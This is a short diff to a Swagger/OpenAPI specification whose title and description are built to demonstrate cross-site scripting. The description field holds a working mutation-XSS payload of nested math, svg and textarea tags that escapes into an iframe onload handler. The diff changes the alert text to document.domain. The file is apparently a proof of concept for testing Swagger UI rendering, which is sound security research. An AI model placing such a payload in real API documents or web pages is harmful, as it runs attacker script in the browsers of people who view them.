@@ -4,4 +4,4 @@ info:
   title: Uwu Swagger XSS UwU
   description:
     <h4>xss</h4>
-    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(Trustwave_Is_Amazing)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
+    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
